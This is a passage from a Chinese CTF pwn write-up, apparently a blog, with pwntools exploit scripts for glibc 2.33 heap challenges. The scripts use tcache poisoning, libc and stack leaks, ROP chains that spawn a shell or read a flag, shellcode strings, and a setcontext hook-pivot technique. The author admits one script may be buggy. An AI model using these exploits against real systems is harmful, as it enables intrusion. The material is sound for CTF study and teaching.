class="hljs-comment">#------------------------------------------------------------------------------------------------------#</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">size, index, context</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br>sla(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>sa(<span class="hljs-string">&quot;Content: &quot;</span>, context)<br><br><span class="hljs-comment"># fill tcache</span><br>add() <span class="hljs-comment"># 0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add() <span class="hljs-comment"># 1 - 7</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>delete(i+<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># leak libc</span><br>show(<span class="hljs-number">0</span>)<br>sh.recv()<br>fd = uu64()<br>libc_base = fd - <span class="hljs-number">0x218cc0</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>system = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>environ = libc_base + libc.symbols[<span class="hljs-string">&#x27;environ&#x27;</span>]<br>pop_rdi = libc_base + <span class="hljs-number">0x000000000002e6c5</span><br>ret = libc_base + <span class="hljs-number">0x000000000002d9b9</span><br>lg(<span class="hljs-string">&#x27;environ&#x27;</span>)<br><br><span class="hljs-comment"># leak tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>add()<br>show(<span class="hljs-number">1</span>)<br>sh.recv()<br><span class="hljs-built_in">next</span> = u64(sh.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;next&#x27;</span>)<br>fake_next = <span class="hljs-built_in">next</span> ^ environ<br><br><span class="hljs-comment"># leak stack</span><br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">8</span>, <span class="hljs-number">2</span>, p64(fake_next))<br>add() <span class="hljs-comment"># 14</span><br>add() <span class="hljs-comment"># 15</span><br>show(<span class="hljs-number">15</span>)<br>sh.recv()<br>leak_stack = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;leak_stack&#x27;</span>)<br>fake_addr = leak_stack - <span class="hljs-number">0x168</span><br><br><span class="hljs-comment"># make rop</span><br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">9</span>)<br>fake_next = <span class="hljs-built_in">next</span> ^ fake_addr<br>edit(<span class="hljs-number">8</span>, <span class="hljs-number">9</span>, p64(fake_next))<br>add()<br>add()<br><span class="hljs-comment"># dbg()</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)<br>edit(<span class="hljs-number">0x38</span>, <span class="hljs-number">17</span>, payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="bigduck"><a href="#bigduck" class="headerlink" title="bigduck"></a>bigduck</h2><p>这道题是上一道题的进阶，开启了沙盒禁用了execve，所以我们考虑用orw来解决问题，学习两种方法。</p><h3 id="堆栈结合-利用environ-1"><a href="#堆栈结合-利用environ-1" class="headerlink" title="堆栈结合(利用environ)"></a>堆栈结合(利用environ)</h3><p>注意一个坑，在泄露libc的时候，fd的低位为\x00，无法泄露fd，选择覆盖fd直至bk的低位一个字节，泄露bk。</p><blockquote><p>打比赛的时候踩坑了┭┮﹏┭┮</p><p>脚本好像有点问题，下周改一下</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding = utf-8</span><br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> environ<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span> :<br>sh = process([<span class="hljs-string">b&quot;./ld.so&quot;</span>, <span class="hljs-string">b&quot;./pwn&quot;</span>], env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : <span class="hljs-string">b&quot;./libc.so.6&quot;</span>&#125;)<br><span class="hljs-keyword">elif</span> local == <span class="hljs-number">2</span> :<br>    sh = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-keyword">else</span> :<br>sh = remote(ip, port)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(sh)<br>    pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">slibc</span>(<span class="hljs-params">leak_name, leak_addr, flag = <span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-number">0</span> :<br>        libc_base = leak_addr - libc.symbols[<span class="hljs-built_in">str</span>(leak_name)]<br>        sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>        bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>    <span class="hljs-keyword">else</span> :<br>        libcsch = LibcSearcher(<span class="hljs-built_in">str</span>(leak_name), leak_addr)<br>        libc_base = leak_addr - libcsch.dump(<span class="hljs-built_in">str</span>(leak_name))<br>        sys_addr = libc_base + libcsch.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>        bin_sh = libc_base + libcsch.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> [sys_addr, bin_sh]<br><br>s       = <span class="hljs-keyword">lambda</span> data               :sh.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> text, data         :sh.sendafter(text, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> text, data         :sh.sendlineafter(text, data)<br>r       = <span class="hljs-keyword">lambda</span> num                :sh.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> text               :sh.recvuntil(text)<br>uu32    = <span class="hljs-keyword">lambda</span>                    :u32(sh.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span>                    :u64(sh.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg      = <span class="hljs-keyword">lambda</span> s                  :sh.success(<span class="hljs-string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>sh_x86_18=<span class="hljs-string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x86_20=<span class="hljs-string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br>sh_x64_21=<span class="hljs-string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span><br><span class="hljs-comment">#https://www.exploit-db.com/shellcodes</span><br><br><span class="hljs-comment">#------------------------------------------------------------------------------------------------------#</span><br><span class="hljs-comment"># set solib-search-path /home/zyy/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">size, index, context</span>):<br>sla(<span class="hljs-string">&quot;Choice: &quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>sla(<span class="hljs-string">&quot;Idx: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br>sla(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>sa(<span class="hljs-string">&quot;Content: &quot;</span>, context)<br><br><span class="hljs-comment"># fill tcache</span><br>add() <span class="hljs-comment"># 0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>add() <span class="hljs-comment"># 1 - 7</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>delete(i+<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># leak libc</span><br>delete(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">9</span>)<span class="hljs-comment"># LOWORD(fd)=0x00,fill fd-&gt;LOWORD(bk)</span><br>show(<span class="hljs-number">0</span>)<span class="hljs-comment"># leak bk</span><br>libc_base = uu64() - <span class="hljs-number">0x1e0c61</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>environ = libc_base + libc.sym[<span class="hljs-string">&#x27;environ&#x27;</span>]<br>op = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>rd = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>pt = libc_base + libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;environ&#x27;</span>)<br>pop_rdi = libc_base + <span class="hljs-number">0x0000000000028a55</span><br>pop_rsi = libc_base + <span class="hljs-number">0x000000000002a4cf</span><br>pop_rdx_r12 = libc_base + <span class="hljs-number">0x0000000000112a51</span><br><br><span class="hljs-comment"># leak tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>add()<span class="hljs-comment"># 8 - 13</span><br>show(<span class="hljs-number">1</span>)<br>sh.recv()<br><span class="hljs-built_in">next</span> = u64(sh.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;next&#x27;</span>)<br><br><span class="hljs-comment"># leak stack</span><br>fake_next = <span class="hljs-built_in">next</span> ^ environ<br>delete(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">8</span>, <span class="hljs-number">2</span>, p64(fake_next))<br>add() <span class="hljs-comment"># 14</span><br>add() <span class="hljs-comment"># 15</span><br>show(<span class="hljs-number">15</span>)<br>leak_stack = uu64()<br>lg(<span class="hljs-string">&#x27;leak_stack&#x27;</span>)<br>fake_addr = leak_stack - <span class="hljs-number">0x110</span><br>lg(<span class="hljs-string">&#x27;fake_addr&#x27;</span>)<br><br><span class="hljs-comment"># make rop</span><br>delete(<span class="hljs-number">8</span>)<br>delete(<span class="hljs-number">9</span>)<br>fake_next = <span class="hljs-built_in">next</span> ^ fake_addr<br>edit(<span class="hljs-number">8</span>, <span class="hljs-number">9</span>, p64(fake_next))<br>add() <span class="hljs-comment"># 16</span><br><span class="hljs-comment"># dbg()</span><br>add() <span class="hljs-comment"># 17</span><br><br>owr = <span class="hljs-string">b&#x27;flag\x00&#x27;</span><br>owr = owr.ljust(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>owr += p64(pop_rdi) + p64(fake_addr) + p64(op)<br>owr += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(fake_addr + <span class="hljs-number">0x100</span>) + p64(pop_rdx_r12) + p64(<span class="hljs-number">0x30</span>)*<span class="hljs-number">2</span> + p64(rd)<br>owr += p64(pop_rdi) + p64(fake_addr + <span class="hljs-number">0x100</span>) + p64(pt)<br>edit(<span class="hljs-built_in">len</span>(owr), <span class="hljs-number">17</span>, owr)<br>sh.recv()<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h3 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h3><p>这道题目是libc2.33的，还未禁用hook函数，我们可以覆盖hook函数为libc中的setcontext，实现owr。</p><blockquote><p>参考文章：<a href="https://blog.csdn.net/A951860555/article/details/118268484">(8条消息) pwn题堆利用的一些姿势 – setcontext___lifanxin的博客-CSDN博客_setcontext</a></p></blockquote><p>在这里可以用IDA查看setcontext中的内容，这里我们需要的汇编片段的偏移是0x3d，如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052970</span> F3 0F 1E FA                   endbr64<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052974</span> <span class="hljs-number">57</span>                            <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rdi</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052975</span> <span class="hljs-number">48</span> <span class="hljs-number">8D</span> B7 <span class="hljs-number">28</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rdi</span>+<span class="hljs-number">128h</span>]       <span class="hljs-comment">; nset</span><br><span class="hljs-symbol">.text:</span>000000000005297C <span class="hljs-number">31</span> D2                         <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-built_in">edx</span>              <span class="hljs-comment">; oset</span><br><span class="hljs-symbol">.text:</span>000000000005297E BF <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-number">2</span>                <span class="hljs-comment">; how</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052983</span> <span class="hljs-number">41</span> BA <span class="hljs-number">08</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>             <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r10d</span>, <span class="hljs-number">8</span>               <span class="hljs-comment">; sigsetsize</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052989</span> B8 0E <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>                <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0Eh</span><br><span class="hljs-symbol">.text:</span>000000000005298E 0F <span class="hljs-number">05</span>                         <span class="hljs-keyword">syscall</span>                       <span class="hljs-comment">; LINUX - sys_rt_sigprocmask</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052990</span> 5A                            <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rdx</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052991</span> <span class="hljs-number">48</span> <span class="hljs-number">3D</span> <span class="hljs-number">01</span> F0 FF FF             <span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-number">0FFFFFFFFFFFFF001h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052997</span> 0F <span class="hljs-number">83</span> <span class="hljs-number">22</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>             <span class="hljs-keyword">jnb</span>     loc_52ABF<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000052997</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000005299D</span> <span class="hljs-number">48</span> 8B 8A E0 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0E0h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529A4 D9 <span class="hljs-number">21</span>                         <span class="hljs-keyword">fldenv</span>  <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rcx</span>]<br><span class="hljs-symbol">.text:</span>00000000000529A6 0F AE <span class="hljs-number">92</span> C0 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">ldmxcsr</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">1C0h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529AD <span class="hljs-number">48</span> 8B A2 A0 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsp</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0A0h</span>]# 嘿，我在这里！！<br><span class="hljs-symbol">.text:</span>00000000000529B4 <span class="hljs-number">48</span> 8B 9A <span class="hljs-number">80</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbx</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">80h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529BB <span class="hljs-number">48</span> 8B 6A <span class="hljs-number">78</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">78h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529BF 4C 8B <span class="hljs-number">62</span> <span class="hljs-number">48</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r12</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">48h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529C3 4C 8B 6A <span class="hljs-number">50</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r13</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">50h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529C7 4C 8B <span class="hljs-number">72</span> <span class="hljs-number">58</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r14</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">58h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529CB 4C 8B 7A <span class="hljs-number">60</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r15</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">60h</span>]<br><span class="hljs-symbol">.text:</span>00000000000529CF <span class="hljs-number">64</span> F7 <span class="hljs-number">04</span> <span class="hljs-number">25</span> <span class="hljs-number">48</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span>+<span class="hljs-keyword">test</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">fs</span>:<span class="hljs-number">48h</span>, <span class="hljs-number">2</span><br><span class="hljs-symbol">.text:</span>00000000000529CF <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-symbol">.text:</span>00000000000529<span class="hljs-built_in">DB</span> 0F <span class="hljs-number">84</span> B5 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>             <span class="hljs-keyword">jz</span>      loc_52A96<br><span class="hljs-symbol"></span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">.text:</span>0000000000052A96                               loc_52A96:                    <span class="hljs-comment">; CODE XREF: setcontext+6B↑j</span><br><span class="hljs-symbol">.text:</span>0000000000052A96 <span class="hljs-number">48</span> 8B 8A A8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">0A8h</span>]<br><span class="hljs-symbol">.text:</span>0000000000052A9D <span class="hljs-number">51</span>                            <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rcx</span><br><span class="hljs-symbol">.text:</span>0000000000052A9E <span class="hljs-number">48</span> 8B <span class="hljs-number">72</span> <span class="hljs-number">70</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">70h</span>]<br><span class="hljs-symbol">.text:</span>0000000000052AA2 <span class="hljs-number">48</span> 8B 7A <span class="hljs-number">68</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">68h</span>]<br><span class="hljs-symbol">.text:</span>0000000000052AA6 <span class="hljs-number">48</span> 8B 8A <span class="hljs-number">98</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rcx</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">98h</span>]<br><span class="hljs-symbol">.text:</span>0000000000052<span class="hljs-keyword">AAD</span> 4C 8B <span class="hljs-number">42</span> <span class="hljs-number">28</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r8</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">28h</span>]<br><span class="hljs-symbol">.text:</span>0000000000052AB1 4C 8B 4A <span class="hljs-number">30</span>                   <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r9</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">30h</span>]<br><span class="hljs-symbol">.text:</span>0000000000052AB5 <span class="hljs-number">48</span> 8B <span class="hljs-number">92</span> <span class="hljs-number">88</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rdx</span>+<span class="hljs-number">88h</span>]<br><span class="hljs-symbol">.text:</span>0000000000052AB5                               <span class="hljs-comment">; &#125; // starts at 52970</span><br><span class="hljs-symbol">.text:</span>0000000000052ABC                               <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span>0000000000052ABC <span class="hljs-number">31</span> C0                         <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>0000000000052ABE C3                            <span class="hljs-keyword">retn</span><br><span class="hljs-symbol">.text:</span>0000000000052ABE<br></code></pre></td></tr></table></figure><p>需要注意的是：这里和上面给的参考文章有区别，一是偏移不一样，另外最重要的是，本人给出的汇编是以rdx为基础去找偏移，而参考文章是以rdi为基础去找偏移，所以我们需要一段gadget将rdi中的值转化为rdx，并且我们还需要控制程序执行流执行setcontext。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">ROPgadget --binary libc.so.6 --only &#x27;mov|call&#x27; | grep rdx<br>找到以下一个片段：<br>mov rdx, dword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]<br></code></pre></td></tr></table></figure><p>可以首先覆盖hook函数为这一段gadget，然后通过控制malloc和free堆块其中内容的布局，使得下一次<code>call qword ptr [rdx + 